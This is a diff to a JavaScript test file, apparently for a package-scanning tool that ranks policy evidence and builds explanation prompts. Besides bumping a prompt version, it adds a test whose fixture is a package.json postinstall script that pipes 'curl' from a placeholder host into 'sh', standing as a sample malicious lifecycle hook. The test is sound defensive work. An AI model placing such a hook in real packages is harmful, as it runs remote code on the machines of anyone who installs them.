@@ -206,7 +206,7 @@ test("lifecycle, dependency and executable manifest changes outrank generic meta
     section.omittedEvidenceGroups.some((group) => group.kind === "comparison"),
   );
   assert.match(prompt.task, /signal groups/u);
-  assert.equal(prompt.promptVersion, "diff-3");
+  assert.equal(prompt.promptVersion, "diff-4");
 });
 
 test("signal ranking keeps policy first and orders capability cues by signal", async () => {
@@ -388,7 +388,7 @@ test("modified spans become exact before/after line hunks with absolute UTF-8 by
   );
   assert.equal(section.status, "complete");
   assert.match(prompt.diffHunkFormat, /source=before artifact=after/u);
-  assert.equal(prompt.promptVersion, "diff-3");
+  assert.equal(prompt.promptVersion, "diff-4");
   assert.deepEqual(prompt.diffHunks, [
     {
       path: "lib/a.js",
@@ -617,5 +617,54 @@ test("two code-heavy policy findings both fit the default budget alongside the s
   assert.deepEqual(
     prompt.evidence.map((e) => e.id),
     policyIds,
+  );
+});
+
+test("an empty insertion-point member does not drop a policy group with citable evidence", async () => {
+  const added =
+    '"scripts":{"postinstall":"curl -s https://collector.invalid/i | sh"},';
+  const report = crowdedReport();
+  report.evidence = [
+    piece("ins-a", "artifact", "package.json", added, 62),
+    { ...piece("ins-s", "source", "package.json", "", 62), excerpt: "" },
+  ];
+  report.files = [
+    {
+      path: "package.json",
+      state: "changed",
+      spans: {
+        artifact: [62, 62 + Buffer.byteLength(added)],
+        source: [62, 62],
+      },
+      evidenceIds: ["ins-a", "ins-s"],
+    },
+  ];
+  report.cues = [];
+  report.policy.findings = [
+    { ruleId: "lifecycle-source-absent", evidenceIds: ["ins-a", "ins-s"] },
+  ];
+  const { section, prompt } = await explainWithPrompt(report, [
+    { evidenceId: "ins-a", quote: "curl -s https://collector.invalid/i | sh" },
+  ]);
+  assert.equal(section.status, "complete");
+  assert.deepEqual(prompt.evidenceGroups[0], {
+    kind: "policy",
+    ruleId: "lifecycle-source-absent",
+    evidenceIds: ["ins-a"],
+    paired: false,
+  });
+  assert.ok(
+    !section.omittedEvidenceGroups.some(
+      (group) => group.reason === "unavailable-evidence",
+    ),
+  );
+  assert.ok(section.omittedEvidenceIds.includes("ins-s"));
+  assert.deepEqual(
+    prompt.diffHunks.map((hunk) => [
+      hunk.change,
+      hunk.source,
+      hunk.lines[0][3],
+    ]),
+    [["added", [62, 62], added]],
   );
 });
